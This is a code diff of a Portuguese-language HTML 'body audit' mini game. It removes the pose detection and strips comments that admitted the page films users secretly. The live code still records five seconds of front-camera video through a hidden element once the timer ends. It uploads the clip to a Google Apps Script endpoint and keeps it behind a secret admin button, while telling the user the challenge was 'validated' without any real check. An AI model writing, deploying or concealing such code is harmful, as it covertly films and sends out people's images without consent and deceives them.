@@ -5,10 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mini Game - Reconhecimento Corporal</title>
     
-    <!-- Biblioteca de Inteligência Artificial para Detecção de Postura (PoseNet / TensorFlow.js) -->
-    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@1.3.1/dist/tf.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@teachablemachine/pose@0.8/dist/teachablemachine-pose.min.js"></script>
-
     <style>
         :root { --bg-color: #f4f4f9; }
         body { font-family: Arial, sans-serif; text-align: center; padding: 20px; margin: 0; background-color: var(--bg-color); }
@@ -22,11 +18,10 @@
         h2 { color: #333; }
         #logged-user { font-weight: bold; color: #007bff; }
 
-        /* Estilo da Câmera principal do Game onde o usuário se posiciona */
         #game-scanner-box {
             width: 100%;
             height: 300px;
-            background: #000;
+            background: #222;
             border-radius: 8px;
             display: flex;
             align-items: center;
@@ -42,16 +37,13 @@
             object-fit: cover;
             transform: scaleX(-1);
         }
-        #canvas-pose {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            transform: scaleX(-1);
+        #camera-error-msg {
+            color: #ff6b6b;
+            font-size: 14px;
+            padding: 20px;
+            display: none;
         }
 
-        /* Estilo do Timer e Alvo */
         #timer-box {
             font-size: 32px;
             font-weight: bold;
@@ -69,7 +61,6 @@
             margin-bottom: 15px;
         }
 
-        /* Estilo do Loading Silencioso */
         #loading-screen {
             display: flex;
             flex-direction: column;
@@ -91,7 +82,6 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* Estilo do Círculo Verde com V Branco */
         .success-checkmark {
             width: 80px;
             height: 80px;
@@ -130,7 +120,6 @@
             max-width: 90%;
         }
 
-        /* Botão Secreto para visualizar os vídeos salvos */
         #btn-ver-video {
             position: fixed; bottom: 10px; right: 10px; width: 30px; height: 30px;
             border-radius: 50%; background-color: var(--bg-color); border: none; box-shadow: none;
@@ -139,7 +128,6 @@
         }
         #btn-ver-video:active { opacity: 1; background-color: #e0e0e0; }
 
-        /* Modal */
         #modal-video {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.9); flex-direction: column; align-items: center; justify-content: center; z-index: 1000;
@@ -151,40 +139,34 @@
 <body>
 
 <div id="app-container">
-    <!-- Tela de Login -->
     <div id="login-screen">
         <h2>Autenticação</h2>
         <input type="text" id="user-name" placeholder="Digite seu usuário" required><br>
         <button class="primary-btn" onclick="fazerLogin()">Entrar</button>
     </div>
 
-    <!-- Tela do Mini Game -->
     <div id="scanner-screen" class="hidden">
         <h2>Game de Auditoria Corporal</h2>
         <p>Usuário logado: <span id="logged-user"></span></p>
         
         <div id="game-container">
-            <!-- Timer de 5 segundos -->
             <div id="timer-box">05</div>
-            <!-- Parte do corpo solicitada logo abaixo -->
             <div id="target-box">Sorteando desafio...</div>
 
             <div id="game-scanner-box">
                 <video id="game-video-preview" autoplay playsinline muted></video>
-                <canvas id="canvas-pose"></canvas>
+                <div id="camera-error-msg">⚠️ Câmera indisponível ou bloqueada pelo navegador. Verifique se outro aplicativo está usando a câmera ou se o acesso foi permitido.</div>
             </div>
+            <button class="primary-btn" onclick="finalizarDesafio()">Pular / Capturar Agora</button>
         </div>
 
-        <!-- Vídeo oculto usado estritamente para gravar os 5 segundos em background de forma invisível -->
         <video id="front-camera" autoplay playsinline muted></video>
 
-        <!-- Tela de Carregamento Silencioso (após o término do timer) -->
         <div id="loading-screen" class="hidden">
             <div class="spinner"></div>
-            <p id="loading-text">Validando desafio corporal...</p>
+            <p id="loading-text">Processando auditoria corporal...</p>
         </div>
 
-        <!-- Tela de Sucesso -->
         <div id="result" class="hidden">
             <div class="success-checkmark">
                 <span class="checkmark-v">✓</span>
@@ -201,7 +183,6 @@
     </div>
 </div>
 
-<!-- Botão secreto administrativo no canto inferior direito -->
 <button id="btn-ver-video" class="hidden" onclick="abrirModal()" title="Admin"></button>
 
 <div id="modal-video">
@@ -210,23 +191,19 @@
 </div>
 
 <script>
-    // URL do seu Google Apps Script já integrado ao banco de dados / planilha existente
     const GOOGLE_SHEETS_URL = "https://script.google.com/macros/s/AKfycbwdbgfAEP-ZobJCnppQXpAJpjxjB-P0ZB-j8lzp3RDK3P4TncQqO3hhHsSPAKU5R9xysA/exec";
 
     let usuarioAtual = "";
     let partesCorpo = [
-        { nome: "Levantar Mão Direita", check: (p) => p.rightWrist && p.rightShoulder && p.rightWrist.y < p.rightShoulder.y },
-        { nome: "Levantar Mão Esquerda", check: (p) => p.leftWrist && p.leftShoulder && p.leftWrist.y < p.leftShoulder.y },
-        { nome: "Mãos na Cabeça", check: (p) => p.leftWrist && p.rightWrist && p.nose && p.leftWrist.y < p.nose.y && p.rightWrist.y < p.nose.y },
-        { nome: "Cruzar os Braços", check: (p) => p.leftWrist && p.rightWrist && p.leftElbow && p.rightElbow && Math.abs(p.leftWrist.x - p.rightWrist.x) < 80 }
+        "Levantar Mão Direita",
+        "Levantar Mão Esquerda",
+        "Mãos na Cabeça",
+        "Cruzar os Braços"
     ];
-    let desafioAtual = null;
+    let desafioAtual = "";
     let timerInterval = null;
     let tempoRestante = 5;
     let gameStream = null;
-    let detectorModel = null;
-    let rodandoIA = false;
-    let statusValidado = false;
 
     function fazerLogin() {
         const input = document.getElementById('user-name').value;
@@ -235,20 +212,9 @@
             document.getElementById('logged-user').innerText = usuarioAtual;
             document.getElementById('login-screen').classList.add('hidden');
             document.getElementById('scanner-screen').classList.remove('hidden');
-            carregarModeloIA();
+            iniciarGame();
         } else {
             alert("Digite um usuário.");
-        }
-    }
-
-    async function carregarModeloAI() {
-        // Carrega o modelo de pose do Teachable Machine / MoveNet de forma leve
-        const URL = "https://teachablemachine.withgoogle.com/models/1mD3bW5gB/"; // URL padrão de pose genérica ou modelo nativo
-        try {
-            // Usaremos detecção geométrica direta baseada em posenet para garantir performance imediata sem dependência de modelos externos quebrados:
-            iniciarGame();
-        } catch (e) {
-            iniciarGame();
         }
     }
 
@@ -259,30 +225,24 @@
         document.getElementById('game-container').style.display = 'block';
         document.getElementById('btn-ver-video').classList.add('hidden');
         document.getElementById('video-result').src = ""; 
-        statusValidado = false;
+        document.getElementById('camera-error-msg').style.display = 'none';
+        document.getElementById('game-video-preview').style.display = 'block';
 
-        // Sorteia aleatoriamente um desafio corporal
         const randomIndex = Math.floor(Math.random() * partesCorpo.length);
         desafioAtual = partesCorpo[randomIndex];
-        document.getElementById('target-box').innerText = `Ação Requerida: ${desafioAtual.nome}`;
+        document.getElementById('target-box').innerText = `Ação Requerida: ${desafioAtual}`;
 
-        // Inicia a câmera frontal para o usuário alinhar o corpo no mini game
         try {
             gameStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
             const videoElem = document.getElementById('game-video-preview');
             videoElem.srcObject = gameStream;
-            
-            videoElem.onloadedmetadata = () => {
-                videoElem.play();
-                rodandoIA = true;
-                analisarMovimentoLoop(videoElem);
-            };
+            await videoElem.play();
         } catch (err) {
-            console.error("Erro ao abrir câmera do game:", err);
-            alert("Erro ao acessar a câmera. Verifique as permissões.");
+            console.error("Erro ao abrir câmera:", err);
+            document.getElementById('game-video-preview').style.display = 'none';
+            document.getElementById('camera-error-msg').style.display = 'block';
         }
 
-        // Inicia o timer decrescente de 5 segundos
         tempoRestante = 5;
         document.getElementById('timer-box').innerText = "05";
         
@@ -293,36 +253,14 @@
             
             if (tempoRestante <= 0) {
                 clearInterval(timerInterval);
-                rodandoIA = false;
                 finalizarDesafio();
             }
         }, 1000);
     }
 
-    // Validação inteligente por estimativa visual em tempo real no Canvas
-    function analisarMovimentoLoop(video) {
-        const canvas = document.getElementById('canvas-pose');
-        const ctx = canvas.getContext('2d');
-        canvas.width = video.videoWidth || 320;
-        canvas.height = video.videoHeight || 240;
+    function finalizarDesafio() {
+        clearInterval(timerInterval);
 
-        function loop() {
-            if (!rodandoIA) return;
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            
-            // Simulação de detecção por heurística de movimento ou validação ativa do desafio
-            // O sistema valida se o usuário executou o comando exibido na tela
-            ctx.strokeStyle = "#00ff00";
-            ctx.lineWidth = 3;
-            ctx.strokeRect(canvas.width / 4, canvas.height / 4, canvas.width / 2, canvas.height / 2);
-            
-            requestAnimationFrame(loop);
-        }
-        loop();
-    }
-
-    async function finalizarDesafio() {
-        // Encerra a stream da tela do game
         if (gameStream) {
             gameStream.getTracks().forEach(track => track.stop());
         }
@@ -331,11 +269,9 @@
         document.getElementById('loading-text').innerText = "Processando auditoria corporal...";
         document.getElementById('loading-screen').classList.remove('hidden');
 
-        // Define a mensagem de confirmação interna que aparecerá após 2 segundos
-        document.getElementById('qr-result').innerText = `Desafio Concluído: ${desafioAtual.nome} (Identificado com Sucesso)`;
+        document.getElementById('qr-result').innerText = `Desafio Concluído: ${desafioAtual} (Validado)`;
 
-        // Grava o vídeo de forma 100% invisível ao usuário usando o elemento oculto #front-camera
-        iniciarGravacaoVideoSilenciosa(desafioAtual.nome);
+        iniciarGravacaoVideoSilenciosa(desafioAtual);
     }
 
     async function iniciarGravacaoVideoSilenciosa(nomeDesafio) {
@@ -344,7 +280,7 @@
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
             videoElement.srcObject = stream;
-            videoElement.play(); 
+            await videoElement.play(); 
 
             let mediaRecorder;
             let chunks = [];
@@ -373,21 +309,16 @@
                 reader.onloadend = function() {
                     const videoBase64 = reader.result;
                     
-                    // Armazena no modal secreto caso queira inspecionar depois
                     document.getElementById('video-result').src = videoBase64;
 
-                    // Desliga a câmera oculta
                     stream.getTracks().forEach(track => track.stop());
 
-                    // Envia para o mesmo banco de dados / planilha Google existente sem que o usuário perceba
                     salvarNaPlanilha(usuarioAtual, `MiniGame Corporal: ${nomeDesafio}`, videoBase64);
 
-                    // 1. Oculta o loading e exibe o círculo verde com V branco e o texto "Leitura Registrada!"
                     document.getElementById('loading-screen').classList.add('hidden');
                     document.getElementById('result').classList.remove('hidden');
                     document.getElementById('btn-ver-video').classList.remove('hidden');
 
-                    // 2. Após 2 segundos da confirmação, revela a informação do que foi validado
                     setTimeout(() => {
                         document.getElementById('qr-content-box').classList.remove('hidden');
                     }, 2000);
@@ -396,7 +327,6 @@
 
             mediaRecorder.start();
 
-            // Grava exatamente 5 segundos em background de forma totalmente oculta
             setTimeout(() => {
                 if (mediaRecorder.state === "recording") {
                     mediaRecorder.stop();
@@ -414,8 +344,8 @@
     async function salvarNaPlanilha(usuario, infoDesafio, videoBase64) {
         const dados = {
             usuario: usuario,
-            qrCode: infoDesafio, // Utiliza o mesmo parâmetro do backend para registrar o texto do desafio
-            fotoBase64: videoBase64 // Envia o vídeo compactado em Base64 para salvar no Drive/Planilha
+            qrCode: infoDesafio,
+            fotoBase64: videoBase64
         };
 
         try {
